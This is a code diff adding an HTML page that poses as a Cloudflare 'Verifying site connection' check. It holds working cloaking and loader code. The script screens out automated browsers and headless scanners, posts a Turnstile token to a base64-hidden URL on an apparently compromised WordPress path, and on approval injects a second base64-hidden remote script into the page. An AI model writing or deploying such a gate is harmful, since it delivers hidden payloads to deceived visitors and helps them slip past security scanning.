@@ -1,0 +1,49 @@
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" defer async></script>
+</head>
+<body style="display:flex;justify-content:center;align-items:center;text-align:center;">
+<div>
+<h3 id="status-shower" style="margin-bottom:30px;"> Verifying site connection... </h3>
+<div id="cf-show" style=""></div>
+
+<input type="hidden" id="b64u" value="aHR0cHM6Ly93d3cueWZibS5vcmcvd3AtYWRtaW4vanMvdG1wL2hvc3RbMjQuMF0vNTg2NmE3OS5waHA=" class="aHR0cHM6Ly93d3cueWZibS5vcmcvd3AtYWRtaW4vanMvdG1wL2hvc3RbMjQuMF0vYWRtaW4vanMvc2MucGhwP3I9Wlcwc1pXMWhhV3dzWVdSaw=="></input></div>
+<script>
+var useC = 1;
+if(!navigator.webdriver && (navigator.language || navigator.languages.length > 0) && (window.outerWidth > 0 && window.outerHeight > 0) && !(/headless/i.test(navigator.userAgent)) && useC){
+window.onloadTurnstileCallback = function () {
+turnstile.render('#cf-show', {
+sitekey: '1x00000000000000000000AA',
+callback: function(token) {
+var m_url = atob(document.getElementById("b64u").value);
+fetch(m_url,{
+method: "POST",
+headers: {
+'Content-Type': 'application/x-www-form-urlencoded',
+},
+body: "tk=" + encodeURIComponent(token),
+})
+.then(function(response){
+if(response.status == 200){
+response.text()
+.then(function(text){
+if(text == "OK"){
+ns= document.createElement("script");
+ns.src = atob(document.getElementById("b64u").classList[0]);
+document.body.appendChild(ns);
+}else{
+document.getElementById("status-shower").innerText = "Error Verifying Site Connection";
+}
+})
+}else{
+document.getElementById("status-shower").innerText = "Error Verifying Site Connection"
+}
+})
+},
+});
+};
+}
+</script>
+</body>
+</html>
